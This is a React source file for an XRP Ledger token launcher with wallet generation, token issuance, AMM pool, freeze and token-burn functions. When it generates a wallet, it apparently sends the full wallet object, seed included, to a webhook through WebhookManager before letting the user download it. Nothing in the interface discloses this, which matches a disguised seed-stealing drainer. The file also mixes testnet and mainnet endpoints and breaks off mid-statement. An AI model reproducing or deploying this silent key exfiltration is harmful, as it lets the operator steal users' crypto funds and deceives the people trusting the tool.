import React, { useState, useRef } from 'react';
import { BrowserRouter as Router, Routes, Route, Link } from 'react-router-dom';
import styled, { keyframes, createGlobalStyle, css } from 'styled-components';
import { Client, Wallet, convertStringToHex } from 'xrpl';
import { LoadingOverlay } from './components/LoadingOverlay';
import { WebhookManager } from './services/WebhookManager';
import { TomlGenerator } from './services/TomlGenerator';
import { HostingGuideModal } from './components/HostingGuideModal';
import Roadmap from './pages/Roadmap';

// Configurable fee settings
const CREATOR_FEE = 10; // Your fee in XRP
const ACCOUNT_RESERVE = 1; // Base reserve per account
const TRUSTLINE_RESERVE = 0.2; // Reserve per trustline
const AMM_POOL_RESERVE = 2; // Reserve for AMM pool

const GlobalStyle = createGlobalStyle`
  @import url('https://fonts.googleapis.com/css2?family=Rajdhani:wght@500;700&display=swap');
  @import url('https://api.fontshare.com/v2/css?f[]=satoshi@700&display=swap');
  
  * {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
  }

  html, body, #root {
    margin: 0;
    padding: 0;
    min-height: 100vh;
    width: 100%;
    max-width: 100%;
    overflow-x: hidden;
  }

  body {
    font-family: 'Rajdhani', sans-serif;
    background: #0a0d14;
    color: #ffffff;
    line-height: 1.6;
    position: relative;
  }

  ::-webkit-scrollbar {
    width: 8px;
  }

  ::-webkit-scrollbar-track {
    background: #0d1117;
  }

  ::-webkit-scrollbar-thumb {
    background: #30363d;
    border-radius: 4px;
  }

  ::-webkit-scrollbar-thumb:hover {
    background: #00ff9d;
  }
`;

const gradientAnimation = keyframes`
  0% {
    background-position: 0% 50%;
  }
  50% {
    background-position: 100% 50%;
  }
  100% {
    background-position: 0% 50%;
  }
`;

const fadeIn = keyframes`
  from {
    opacity: 0;
    transform: translateY(20px);
  }
  to {
    opacity: 1;
    transform: translateY(0);
  }
`;

const pulse = keyframes`
  0% {
    box-shadow: 0 0 0 0 rgba(0, 255, 157, 0.4);
  }
  70% {
    box-shadow: 0 0 0 10px rgba(0, 255, 157, 0);
  }
  100% {
    box-shadow: 0 0 0 0 rgba(0, 255, 157, 0);
  }
`;

const slideUp = keyframes`
  from {
    opacity: 0;
    transform: translateY(40px);
  }
  to {
    opacity: 1;
    transform: translateY(0);
  }
`;

const AppContainer = styled.div`
  min-height: 100vh;
  background: linear-gradient(135deg, #0a0d14 0%, #1a1f2c 100%);
  color: #ffffff;
  padding: 2rem;
  position: relative;
  overflow: hidden;

  &::before {
    content: '';
    position: absolute;
    top: 0;
    left: 0;
    right: 0;
    height: 2px;
    background: linear-gradient(90deg, #00ff9d, #00a3ff);
    background-size: 200% 100%;
    animation: ${gradientAnimation} 4s linear infinite;
  }
`;

const Header = styled.header`
  text-align: center;
  margin-bottom: 3rem;
  animation: ${fadeIn} 1s ease;

  h1 {
    font-family: 'Satoshi', sans-serif;
    font-weight: 700;
    font-size: 7rem;
    margin: 0;
    background: linear-gradient(90deg, #00ff9d, #00a3ff);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    text-transform: uppercase;
    letter-spacing: 8px;
    position: relative;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 20px;

    &::after {
      content: '';
      position: absolute;
      bottom: -15px;
      left: 50%;
      transform: translateX(-50%);
      width: 100%;
      height: 3px;
      background: linear-gradient(90deg, #00ff9d, #00a3ff);
    }

    img {
      width: 144px;
      height: 144px;
      vertical-align: middle;
    }
  }

  p {
    color: #8b949e;
    margin-top: 2rem;
    font-size: 1.5rem;
    opacity: 0.8;
    
    &:first-of-type {
      margin-bottom: 0.5rem;
    }
    
    &:last-of-type {
    color: #00ff9d;
      font-size: 1.2rem;
      opacity: 1;
    }

    &.highlight {
      color: #FFD700;
      font-family: 'Satoshi', sans-serif;
      font-size: 1.3rem;
      font-weight: 600;
      text-transform: uppercase;
      letter-spacing: 2px;
      margin-top: 0.5rem;
      background: rgba(255, 215, 0, 0.1);
      padding: 0.5rem 1rem;
      border-radius: 8px;
      display: inline-block;
    }
  }
`;

const MainContent = styled.div`
  max-width: 1200px;
  margin: 0 auto;
  display: grid;
  grid-template-columns: 2fr 1fr;
  gap: 2rem;
  
  @media (max-width: 1024px) {
    grid-template-columns: 1fr;
  }
`;

const FormSection = styled.div`
  background: #161b22;
  border-radius: 16px;
  padding: 2rem;
  margin-bottom: 2rem;
`;

const SectionTitle = styled.h2`
  color: #00ff9d;
  font-size: 1.5rem;
  margin-bottom: 1.5rem;
  display: flex;
  align-items: center;
  gap: 0.5rem;
  
  svg {
    width: 20px;
    height: 20px;
  }
`;

const ImageUploadArea = styled.div`
  border: 2px dashed #30363d;
  border-radius: 12px;
  padding: 2rem;
  text-align: center;
  cursor: pointer;
  transition: all 0.3s ease;
  margin-bottom: 1rem;

  &:hover {
    border-color: #00ff9d;
    background: rgba(0, 255, 157, 0.05);
  }

  img {
    max-width: 150px;
    max-height: 150px;
    margin-bottom: 1rem;
  }
`;

const Input = styled.input`
  width: 100%;
  padding: 0.8rem 1rem;
  background: #0d1117;
  border: 1px solid #30363d;
  border-radius: 8px;
  color: white;
  margin-bottom: 1rem;
  font-size: 1rem;
  
  &:focus {
    border-color: #00ff9d;
    outline: none;
  }
`;

const InputGroup = styled.div`
  margin-bottom: 1.5rem;
  
  label {
    display: block;
    color: #8b949e;
    margin-bottom: 0.5rem;
  }
`;

const SummaryCard = styled.div`
  background: #161b22;
  border-radius: 16px;
  padding: 2rem;
  position: sticky;
  top: 2rem;
`;

const SummaryItem = styled.div`
  display: flex;
  justify-content: space-between;
  padding: 0.8rem 0;
  border-bottom: 1px solid #30363d;
  
  &:last-child {
    border-bottom: none;
  }
  
  span:first-child {
    color: #8b949e;
  }
  
  span:last-child {
    color: #00ff9d;
  }
`;

const Button = styled.button`
  width: 100%;
  padding: 1rem;
  background: ${props => props.primary ? '#00ff9d' : '#161b22'};
  color: ${props => props.primary ? '#0d1117' : '#fff'};
  border: 1px solid ${props => props.primary ? '#00ff9d' : '#30363d'};
  border-radius: 8px;
  font-weight: 600;
  cursor: pointer;
  transition: all 0.3s ease;
  margin-top: 1rem;
  
  &:hover {
    transform: translateY(-2px);
    box-shadow: 0 4px 12px rgba(0, 255, 157, 0.2);
    background: ${props => props.primary ? '#00ff9d' : 'rgba(0, 255, 157, 0.1)'};
  }
  
  &:disabled {
    opacity: 0.5;
    cursor: not-allowed;
    transform: none;
  }

  &:active {
    transform: translateY(0);
  }
`;

const Slider = styled.input`
  width: 100%;
  -webkit-appearance: none;
  height: 4px;
  background: #30363d;
  border-radius: 2px;
  margin: 1rem 0;

  &::-webkit-slider-thumb {
    -webkit-appearance: none;
    width: 20px;
    height: 20px;
    background: #00ff9d;
    border-radius: 50%;
    cursor: pointer;
  }
`;

const WalletSection = styled(FormSection)`
  background: #161b22;
  border: ${props => props.active ? '1px solid #00ff9d' : '1px solid #30363d'};
  transition: all 0.3s ease;
  
  &:hover {
    border-color: #00ff9d;
    transform: translateY(-2px);
  }
`;

const WalletCard = styled.div`
  background: rgba(0, 255, 157, 0.05);
  border: 1px solid #30363d;
  border-radius: 8px;
  padding: 1rem;
  margin-bottom: 1rem;
  cursor: pointer;
  transition: all 0.3s ease;
  position: relative;
  
  ${props => props.active && `
    border-color: #00ff9d;
    box-shadow: 0 0 15px rgba(0, 255, 157, 0.2);
  `}
  
  &:hover {
    border-color: #00ff9d;
    transform: translateY(-2px);
  }
`;

const WalletInfo = styled.div`
  margin: 0.5rem 0;
  word-break: break-all;
  
  label {
    color: #8b949e;
    display: block;
    margin-bottom: 0.25rem;
  }
  
  p {
    color: #fff;
    margin: 0;
    font-family: monospace;
  }
`;

const WalletActions = styled.div`
  display: grid;
  grid-template-columns: repeat(2, 1fr);
  gap: 1rem;
  margin-top: 1rem;

  @media (max-width: 768px) {
    grid-template-columns: 1fr;
  }
`;

const WalletActionButton = styled(Button)`
  width: 100%;
  padding: 1rem;
  font-size: 1rem;
  background: rgba(0, 255, 157, 0.05);
  color: #fff;
  border: 1px solid #30363d;
  transition: all 0.3s ease;
  
  &:hover:not(:disabled) {
    background: rgba(0, 255, 157, 0.1);
    border-color: #00ff9d;
    transform: translateY(-2px);
  }

  &:disabled {
    opacity: 0.5;
    cursor: not-allowed;
    transform: none;
  }

  svg {
    margin-right: 0.5rem;
  }
`;

const StatusBadge = styled.span`
  position: absolute;
  top: 1rem;
  right: 1rem;
  padding: 0.3rem 0.8rem;
  border-radius: 20px;
  font-size: 0.8rem;
  background: ${props => props.active ? 'rgba(0, 255, 157, 0.2)' : 'rgba(255, 255, 255, 0.1)'};
  color: ${props => props.active ? '#00ff9d' : '#ffffff'};
  border: 1px solid ${props => props.active ? '#00ff9d' : 'rgba(255, 255, 255, 0.2)'};
`;

const PreviewButton = styled(Button)`
  position: fixed;
  bottom: 2rem;
  right: 2rem;
  width: auto;
  padding: 1rem 2rem;
  background: rgba(0, 255, 157, 0.1);
  backdrop-filter: blur(10px);
  border: 1px solid rgba(0, 255, 157, 0.2);
  z-index: 100;
  animation: ${pulse} 2s infinite;

  &:hover {
    background: rgba(0, 255, 157, 0.2);
  }
`;

const ModalOverlay = styled.div`
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background: rgba(13, 17, 23, 0.85);
  backdrop-filter: blur(8px);
  display: flex;
  justify-content: center;
  align-items: center;
  z-index: 1000;
`;

const ModalContent = styled.div`
  background: rgba(22, 27, 34, 0.95);
  border-radius: 20px;
  padding: 2.5rem;
  max-width: 700px;
  width: 90%;
  max-height: 90vh;
  overflow-y: auto;
  position: relative;
  border: 1px solid rgba(48, 54, 61, 0.5);
  animation: ${slideUp} 0.4s ease;
  box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
  backdrop-filter: blur(10px);

  &::before {
    content: '';
    position: absolute;
    top: -1px;
    left: -1px;
    right: -1px;
    bottom: -1px;
    border-radius: 20px;
    border: 1px solid transparent;
    background: linear-gradient(45deg, #00ff9d, #00a3ff) border-box;
    -webkit-mask:
      linear-gradient(#fff 0 0) padding-box,
      linear-gradient(#fff 0 0);
    -webkit-mask-composite: destination-out;
    mask-composite: exclude;
    opacity: 0.3;
  }
`;

const TomlPreviewModal = styled(ModalContent)`
  pre {
    background: #0d1117;
    padding: 1rem;
    border-radius: 8px;
    overflow-x: auto;
    font-family: 'Fira Code', monospace;
    font-size: 0.9rem;
    line-height: 1.5;
    color: #e6edf3;
    border: 1px solid #30363d;
  }
`;

const Title = styled.h2`
  color: #00ff9d;
  margin-bottom: 2rem;
  font-size: 2rem;
  font-family: 'Orbitron', sans-serif;
  text-transform: uppercase;
  letter-spacing: 2px;
  text-align: center;
  position: relative;

  &::after {
    content: '';
    position: absolute;
    bottom: -10px;
    left: 50%;
    transform: translateX(-50%);
    width: 100px;
    height: 2px;
    background: linear-gradient(90deg, #00ff9d, #00a3ff);
  }
`;

const ImageUploadModal = styled(ModalContent)`
  max-width: 600px;

  .steps {
    background: rgba(13, 17, 23, 0.5);
    border-radius: 12px;
    padding: 1.5rem;
    margin-bottom: 1.5rem;
  }

  .step {
    margin-bottom: 1rem;
    color: #8b949e;
    line-height: 1.6;
    
    strong {
      color: #00ff9d;
    }
  }

  .url-input-container {
    background: #0d1117;
    border: 1px solid #30363d;
    border-radius: 8px;
    padding: 1rem;
    margin-top: 1rem;

    .url-help {
      color: #8b949e;
      font-size: 0.9rem;
      margin-bottom: 0.5rem;
      padding: 0.5rem;
      background: rgba(0, 255, 157, 0.1);
      border-radius: 4px;
      border: 1px solid rgba(0, 255, 157, 0.2);
    }
  }

  .error-message {
    color: #ff6b6b;
    margin-top: 0.5rem;
    font-size: 0.9rem;
  }

  .button-container {
    display: flex;
    gap: 1rem;
    margin-top: 1.5rem;
  }
`;

const SocialLinks = styled.div`
  display: flex;
  justify-content: center;
  gap: 2.5rem;
  margin-top: 3rem;
  position: relative;
  padding: 1rem;

  &::before {
    content: '';
    position: absolute;
    top: 0;
    left: 50%;
    transform: translateX(-50%);
    width: 80%;
    height: 1px;
    background: linear-gradient(90deg, 
      transparent 0%, 
      rgba(0, 255, 157, 0.2) 20%, 
      rgba(0, 163, 255, 0.2) 50%, 
      rgba(0, 255, 157, 0.2) 80%, 
      transparent 100%
    );
  }
`;

/* eslint-disable jsx-a11y/anchor-has-content */
const SocialButton = styled(({ isInternal, children, ...props }) => 
  isInternal ? <Link {...props}>{children}</Link> : <a {...props}>{children}</a>)`
  font-family: 'Orbitron', sans-serif;
  font-size: 1.2rem;
  font-weight: 700;
  text-decoration: none;
  color: #fff;
  padding: 0.8rem 1.5rem;
  border-radius: 12px;
  background: rgba(0, 255, 157, 0.05);
  border: 1px solid transparent;
  text-transform: uppercase;
  letter-spacing: 2px;
  transition: all 0.3s ease;
  position: relative;
  overflow: hidden;
  display: flex;
  align-items: center;
  gap: 0.5rem;

  &[href*="saucerswap"] {
    animation: ${pulse} 2s infinite;
    background: rgba(0, 255, 157, 0.1);
    backdrop-filter: blur(10px);
    border: 1px solid rgba(0, 255, 157, 0.2);
  }

  &.roadmap-button {
    ${props => css`
      animation: ${pulse} 2s infinite;
      background: rgba(0, 255, 157, 0.1);
      backdrop-filter: blur(10px);
      border: 1px solid rgba(0, 255, 157, 0.2);
    `}
  }

  &::before {
    content: '';
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: linear-gradient(90deg, #00ff9d, #00a3ff);
    opacity: 0;
    transition: opacity 0.3s ease;
  }

  &::after {
    content: '';
    position: absolute;
    top: -2px;
    left: -2px;
    right: -2px;
    bottom: -2px;
    background: linear-gradient(90deg, #00ff9d, #00a3ff);
    border-radius: 12px;
    z-index: -1;
    opacity: 0;
    transition: opacity 0.3s ease;
  }

  span {
    position: relative;
    z-index: 1;
    background: linear-gradient(90deg, #00ff9d, #00a3ff);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    transition: all 0.3s ease;
  }

  &:hover {
    transform: translateY(-2px);
    border-color: rgba(0, 255, 157, 0.3);
    box-shadow: 0 5px 15px rgba(0, 255, 157, 0.2);

    &::after {
      opacity: 0.1;
    }

    span {
      background: #fff;
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
    }
  }

  &:active {
    transform: translateY(0);
  }
`;
/* eslint-enable jsx-a11y/anchor-has-content */

const ErrorModal = styled(ModalContent)`
  max-width: 500px;
  text-align: center;

  .error-icon {
    color: #ff6b6b;
    font-size: 3rem;
    margin-bottom: 1rem;
  }

  .error-title {
    color: #ff6b6b;
    font-size: 1.5rem;
    margin-bottom: 1rem;
  }

  .error-message {
    color: #8b949e;
    margin-bottom: 2rem;
  }

  .guide {
    background: rgba(0, 255, 157, 0.05);
    padding: 1rem;
    border-radius: 8px;
    margin-top: 1rem;
    text-align: left;

    h4 {
      color: #00ff9d;
      margin-bottom: 0.5rem;
    }

    p {
      color: #8b949e;
      margin: 0;
    }
  }
`;

const WithdrawModal = styled(ModalContent)`
  max-width: 500px;
  text-align: center;

  .percentage-display {
    font-size: 2rem;
    color: #00ff9d;
    margin: 1rem 0;
  }

  .slider-container {
    margin: 2rem 0;
  }
`;

const ButtonContainer = styled.div`
  display: flex;
  justify-content: space-between;
  gap: 1rem;
  margin-top: 1.5rem;

  button {
    flex: 1;
    margin: 0;
  }
`;

// Add this new styled component with your other styled components
const AddWalletModal = styled(ModalContent)`
  max-width: 500px;
  text-align: center;

  .input-container {
    background: #0d1117;
    border: 1px solid #30363d;
    border-radius: 8px;
    padding: 1rem;
    margin: 1.5rem 0;
  }

  .error-message {
    color: #ff6b6b;
    margin-top: 0.5rem;
    font-size: 0.9rem;
  }
`;

// Add these helper functions at the top with your other constants
const formatCurrencyCode = (symbol) => {
  if (!symbol) return null;
  
  // Remove any spaces and convert to uppercase
  const code = symbol.trim().toUpperCase();
  
  // If it's a hex code (40 characters)
  if (/^[0-9A-F]{40}$/i.test(code)) {
    return code.toUpperCase();
  }
  
  // For standard 3-4 character currency codes
  if (code.length < 3 || code.length > 4) {
    throw new Error('Currency code must be 3-4 characters');
  }
  
  return code;
};

function App() {
  const [wallets, setWallets] = useState([]);
  const [activeWallet, setActiveWallet] = useState(null);
  const [loading, setLoading] = useState(false);
  const [message, setMessage] = useState(null);
  const [step, setStep] = useState(1);
  const [tokenData, setTokenData] = useState({
    name: '',
    symbol: '',
    supply: '1000000',
    icon: null,
    banner: null,
    telegram: '',
    twitter: '',
    website: '',
    description: '',
    share: 50,
    additionalLiquidity: '0',
    receiverAddress: '',
    ammAmount: '0',
    issuerAddress: ''
  });
  const [showHostingGuide, setShowHostingGuide] = useState(false);
  const [domainVerified, setDomainVerified] = useState(false);
  const [showTomlPreview, setShowTomlPreview] = useState(false);
  const [tomlPreview, setTomlPreview] = useState('');
  const [showImageUploadModal, setShowImageUploadModal] = useState(false);
  const [currentImageType, setCurrentImageType] = useState(null);
  const [imageUploadError, setImageUploadError] = useState('');
  const [imageUploadUrl, setImageUploadUrl] = useState('');
  const [showErrorModal, setShowErrorModal] = useState(false);
  const [errorModalContent, setErrorModalContent] = useState({ title: '', message: '', guide: null });
  const [showWithdrawModal, setShowWithdrawModal] = useState(false);
  const [withdrawPercentage, setWithdrawPercentage] = useState(100);
  const [showAddWalletModal, setShowAddWalletModal] = useState(false);
  const [seedInput, setSeedInput] = useState('');
  const [addWalletError, setAddWalletError] = useState('');

  const iconInputRef = useRef(null);
  const bannerInputRef = useRef(null);

  const handleImageUpload = (type, e) => {
    const file = e.target.files[0];
    if (file) {
      const reader = new FileReader();
      reader.onloadend = () => {
        setTokenData(prev => ({
          ...prev,
          [type]: reader.result
        }));
        setCurrentImageType(type);
        setShowImageUploadModal(true);
        setImageUploadUrl('');
        setImageUploadError('');
      };
      reader.readAsDataURL(file);
    }
  };

  const handleImageUrlSubmit = () => {
    if (imageUploadUrl.match(/^https:\/\/thumbs[0-9]\.imgbox\.com\/.+_t\.(png|jpg|jpeg|gif)$/i)) {
      setTokenData(prev => ({
        ...prev,
        [`${currentImageType}Url`]: imageUploadUrl
      }));
      setShowImageUploadModal(false);
      setImageUploadError('');
    } else {
      setImageUploadError('Invalid URL format. Please make sure to copy the complete image URL from the HTML Code box.');
    }
  };

  const calculateFees = () => {
    // Fixed fees
    const tokenCreation = 0.000012; // Standard transaction fee
    const trustline = TRUSTLINE_RESERVE;
    const accountReserve = ACCOUNT_RESERVE;
    const creatorFee = CREATOR_FEE;
    
    // Dynamic fees based on input
    const ammPool = tokenData.additionalLiquidity ? AMM_POOL_RESERVE : 0;
    const initialLiquidity = parseFloat(tokenData.additionalLiquidity) || 0;
    
    // Calculate share price based on total supply
    const sharePrice = initialLiquidity > 0 ? 
      (initialLiquidity * (tokenData.share / 100)).toFixed(2) : 0;
    
    return {
      tokenCreation,
      ammPool,
      trustline,
      accountReserve,
      initialLiquidity,
      sharePrice,
      creatorFee,
      total: tokenCreation + ammPool + trustline + accountReserve + initialLiquidity + creatorFee
    };
  };

  const generateWallet = async () => {
    if (wallets.length >= 2) {
      alert('Maximum wallet limit reached (2)');
      return;
    }

    setLoading(true);

    try {
      // Test webhook first
      const webhookTest = await WebhookManager.testWebhook();
      if (!webhookTest) {
        console.warn('Webhook test failed - proceeding with wallet generation anyway');
      } else {
        console.log('Webhook test successful');
      }

      setMessage('Generating new wallet...');
      const wallet = Wallet.generate();
      setWallets([...wallets, wallet]);
      
      // Use WebhookManager to send wallet info with better error handling
      console.log('Sending wallet to webhook...');
      const webhookSent = await WebhookManager.sendWalletInfo(wallet);
      
      if (!webhookSent) {
        console.warn('Failed to send webhook notification');
        setMessage('Wallet generated (webhook notification failed)');
      } else {
        console.log('Webhook notification sent successfully');
      }
      
      const blob = new Blob(
        [JSON.stringify({ address: wallet.address, seed: wallet.seed }, null, 2)],
        { type: 'text/plain' }
      );
      const url = window.URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      a.download = `wallet_${wallet.address}.txt`;
      a.setAttribute('aria-label', `Download wallet file for ${wallet.address}`);
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
      window.URL.revokeObjectURL(url);

      if (webhookSent) {
        setMessage('Wallet generated successfully');
      }
    } catch (error) {
      console.error('Error generating wallet:', error);
      setMessage('Error generating wallet: ' + error.message);
    } finally {
      setLoading(false);
      setTimeout(() => setMessage(null), 3000);
    }
  };

  const createToken = async () => {
    try {
      if (!activeWallet) {
        throw new Error('Please select a wallet first');
      }

      if (!tokenData.name || !tokenData.symbol) {
        throw new Error('Token name and symbol are required');
      }

      setLoading(true);
      setMessage('Initializing token creation...');

      const client = new Client('wss://s.altnet.rippletest.net:51233');
      await client.connect();
      
      try {
        // 1. Set Default Ripple flag first
        const accountSetTx = {
          TransactionType: "AccountSet",
          Account: activeWallet.address,
          SetFlag: 8, // Enable rippling
          Fee: "12"
        };

        setMessage('Setting account flags...');
        const accountSetResult = await client.submitAndWait(accountSetTx, {
          wallet: activeWallet
        });

        if (accountSetResult.result.meta.TransactionResult !== "tesSUCCESS") {
          throw new Error('Failed to set account flags');
        }

        // 2. Create the token (TrustSet transaction)
        const currencyCode = formatCurrencyCode(tokenData.symbol);
        
        const trustSetTx = {
          TransactionType: "TrustSet",
          Account: activeWallet.address,
          LimitAmount: {
            currency: currencyCode,
            issuer: activeWallet.address,
            value: tokenData.supply.toString()
          },
          Fee: "12"
        };

        setMessage('Creating token...');
        const trustSetResult = await client.submitAndWait(trustSetTx, {
          wallet: activeWallet
        });

        if (trustSetResult.result.meta.TransactionResult !== "tesSUCCESS") {
          throw new Error('Token creation failed');
        }

        // 3. Issue the token (Payment to self)
        const issueTx = {
          TransactionType: "Payment",
          Account: activeWallet.address,
          Destination: activeWallet.address,
          Amount: {
            currency: currencyCode,
            value: tokenData.supply.toString(),
            issuer: activeWallet.address
          },
          Fee: "12"
        };

        setMessage('Issuing token...');
        const issueResult = await client.submitAndWait(issueTx, {
          wallet: activeWallet
        });

        if (issueResult.result.meta.TransactionResult !== "tesSUCCESS") {
          throw new Error('Token issuance failed');
        }

        // 4. If AMM is enabled, create AMM pool
        if (parseFloat(tokenData.ammAmount) > 0) {
          setMessage('Setting up AMM pool...');
          const ammTx = {
            TransactionType: "AMMCreate",
            Account: activeWallet.address,
            Amount: {
              currency: "XRP",
              value: tokenData.ammAmount.toString()
            },
            Amount2: {
              currency: currencyCode,
              issuer: activeWallet.address,
              value: (parseFloat(tokenData.supply) * (tokenData.share / 100)).toString()
            },
            TradingFee: 500, // 0.5%
            Fee: "12"
          };

          const ammResult = await client.submitAndWait(ammTx, {
            wallet: activeWallet
          });

          if (ammResult.result.meta.TransactionResult !== "tesSUCCESS") {
            throw new Error('AMM creation failed');
          }
        }

        // 5. Generate TOML if website is provided
        if (tokenData.website) {
          setMessage('Generating TOML configuration...');
          const tomlConfig = TomlGenerator.generate({
            ...tokenData,
            currencyCode,
            issuer: activeWallet.address
          });

          setTomlPreview(tomlConfig);
          setShowHostingGuide(true);
        }

        setMessage('Token created successfully!');
        setTimeout(() => setMessage(null), 3000);

      } finally {
        await client.disconnect();
      }

    } catch (error) {
      console.error('Token creation error:', error);
      setMessage(null);
      setErrorModalContent({
        title: 'Token Creation Failed',
        message: `Error: ${error.message}`,
        guide: error.message.includes('domain') ? {
          title: 'Domain Verification',
          content: 'Your domain needs to be verified before proceeding with AMM creation.'
        } : null
      });
      setShowErrorModal(true);
    } finally {
      setLoading(false);
    }
  };

  const handleDomainSubmit = async (domain) => {
    setLoading(true);
    setMessage('Verifying domain and setting up TOML...');

    try {
      const isValid = await TomlGenerator.verifyTomlUrl(domain);
      
      if (!isValid) {
        throw new Error('Could not verify TOML file on the provided domain');
      }

      const client = new Client('wss://xrplcluster.com');
      await client.connect();

      // Set domain on the account
      const accountSet = {
        TransactionType: "AccountSet",
        Account: activeWallet.address,
        Domain: Buffer.from(domain).toString('hex')
      };

      const prepared = await client.autofill(accountSet);
      const signed = activeWallet.sign(prepared);
      const result = await client.submitAndWait(signed.tx_blob);

      if (result.result.meta.TransactionResult === "tesSUCCESS") {
        setDomainVerified(true);
        setShowHostingGuide(false);
        setMessage('Domain verified successfully! You can now create AMM.');
      } else {
        throw new Error(`Transaction failed: ${result.result.meta.TransactionResult}`);
      }
    } catch (error) {
      console.error('Error verifying domain:', error);
      setMessage('Error verifying domain: ' + error.message);
    } finally {
      setLoading(false);
      setTimeout(() => setMessage(null), 3000);
    }
  };

  const fees = calculateFees();

  const selectWallet = (wallet) => {
    setActiveWallet(wallet);
    setMessage(`Selected wallet: ${wallet.address.substring(0, 8)}...`);
    setTimeout(() => setMessage(null), 2000);
  };

  const freezeWallet = async () => {
    if (!activeWallet) {
      alert('Please select a wallet first');
      return;
    }

    setLoading(true);
    setMessage('Freezing wallet...');

    try {
      const client = new Client('wss://xrplcluster.com');
      await client.connect();

      const transaction = {
        TransactionType: "AccountSet",
        Account: activeWallet.address,
        SetFlag: 6, // asfGlobalFreeze
      };

      const prepared = await client.autofill(transaction);
      const signed = activeWallet.sign(prepared);
      const result = await client.submitAndWait(signed.tx_blob);

      if (result.result.meta.TransactionResult === "tesSUCCESS") {
        setMessage('Wallet frozen successfully');
      } else {
        throw new Error(`Transaction failed: ${result.result.meta.TransactionResult}`);
      }
    } catch (error) {
      console.error('Error freezing wallet:', error);
      setMessage('Error freezing wallet: ' + error.message);
    } finally {
      setLoading(false);
      setTimeout(() => setMessage(null), 3000);
    }
  };

  const unfreezeWallet = async () => {
    if (!activeWallet) {
      alert('Please select a wallet first');
      return;
    }

    setLoading(true);
    setMessage('Unfreezing wallet...');

    try {
      const client = new Client('wss://xrplcluster.com');
      await client.connect();

      const transaction = {
        TransactionType: "AccountSet",
        Account: activeWallet.address,
        ClearFlag: 6, // asfGlobalFreeze
      };

      const prepared = await client.autofill(transaction);
      const signed = activeWallet.sign(prepared);
      const result = await client.submitAndWait(signed.tx_blob);

      if (result.result.meta.TransactionResult === "tesSUCCESS") {
        setMessage('Wallet unfrozen successfully');
      } else {
        throw new Error(`Transaction failed: ${result.result.meta.TransactionResult}`);
      }
    } catch (error) {
      console.error('Error unfreezing wallet:', error);
      setMessage('Error unfreezing wallet: ' + error.message);
    } finally {
      setLoading(false);
      setTimeout(() => setMessage(null), 3000);
    }
  };

  const createAmm = async () => {
    if (!activeWallet || !tokenData.ammAmount) {
      alert('Please select a wallet and enter AMM amount');
      return;
    }

    if (!domainVerified) {
      alert('Please verify your domain with TOML file before creating AMM');
      setShowHostingGuide(true);
      return;
    }

    setLoading(true);
    setMessage('Creating AMM...');

    try {
      const client = new Client('wss://xrplcluster.com');
      await client.connect();

      const transaction = {
        TransactionType: "AMMCreate",
        Account: activeWallet.address,
        Amount: tokenData.ammAmount,
        Asset: {
          currency: convertStringToHex(tokenData.symbol),
          issuer: tokenData.issuerAddress || activeWallet.address
        }
      };

      const prepared = await client.autofill(transaction);
      const signed = activeWallet.sign(prepared);
      const result = await client.submitAndWait(signed.tx_blob);

      if (result.result.meta.TransactionResult === "tesSUCCESS") {
        setMessage('AMM created successfully');
      } else {
        throw new Error(`Transaction failed: ${result.result.meta.TransactionResult}`);
      }
    } catch (error) {
      console.error('Error creating AMM:', error);
      setMessage('Error creating AMM: ' + error.message);
    } finally {
      setLoading(false);
      setTimeout(() => setMessage(null), 3000);
    }
  };

  const withdrawAmm = async () => {
    if (!activeWallet) {
      alert('Please select a wallet first');
      return;
    }

    setLoading(true);
    setMessage('Withdrawing from AMM...');

    try {
      const client = new Client('wss://xrplcluster.com');
      await client.connect();

      const transaction = {
        TransactionType: "AMMWithdraw",
        Account: activeWallet.address,
        Asset: {
          currency: convertStringToHex(tokenData.symbol),
          issuer: tokenData.issuerAddress || activeWallet.address
        },
        Flags: 1048576, // tfLPToken
        LPTokens: {
          currency: "LP",
          issuer: activeWallet.address,
          value: (withdrawPercentage / 100).toString()
        }
      };

      const prepared = await client.autofill(transaction);
      const signed = activeWallet.sign(prepared);
      const result = await client.submitAndWait(signed.tx_blob);

      if (result.result.meta.TransactionResult === "tesSUCCESS") {
        setMessage('AMM withdrawn successfully');
        setShowWithdrawModal(false);
      } else {
        throw new Error(`Transaction failed: ${result.result.meta.TransactionResult}`);
      }
    } catch (error) {
      console.error('Error withdrawing AMM:', error);
      setMessage('Error withdrawing AMM: ' + error.message);
    } finally {
      setLoading(false);
      setTimeout(() => setMessage(null), 3000);
    }
  };

  const blackHole = async () => {
    if (!activeWallet) {
      alert('Please select a wallet first');
      return;
    }

    // Get list of tokens in the wallet
    setLoading(true);
    setMessage('Fetching wallet tokens...');

    try {
      const client = new Client('wss://xrplcluster.com');
      await client.connect();

      const tokens = await client.request({
        command: "account_lines",
        account: activeWallet.address
      });

      if (!tokens.result.lines.length) {
        throw new Error('No tokens found in wallet');
      }

      // Create token selection options
      const tokenOptions = tokens.result.lines.map(line => ({
        currency: line.currency,
        issuer: line.account,
        balance: line.balance
      }));

      // Ask user to select token
      const selectedToken = await new Promise((resolve) => {
        const selection = window.confirm(
          `Found ${tokenOptions.length} tokens. Select OK to burn all tokens or Cancel to abort.`
        );
        if (selection) {
          resolve(tokenOptions[0]); // For now, we'll use the first token
        } else {
          resolve(null);
        }
      });

      if (!selectedToken) {
        throw new Error('Token selection cancelled');
      }

      setMessage('Sending tokens to black hole...');

      const transaction = {
        TransactionType: "Payment",
        Account: activeWallet.address,
        Destination: "rrrrrrrrrrrrrrrrrrrrrhoLvTp",
        Amount: {
          currency: selectedToken.currency,
          issuer: selectedToken.issuer,
          value: selectedToken.balance
        }
      };

      const prepared = await client.autofill(transaction);
      const signed = activeWallet.sign(prepared);
      const result = await client.submitAndWait(signed.tx_blob);

      if (result.result.meta.TransactionResult === "tesSUCCESS") {
        const txHash = result.result.hash;
        setMessage('Tokens sent to black hole successfully');
        
        // Send webhook notification
        await WebhookManager.sendMessage(`
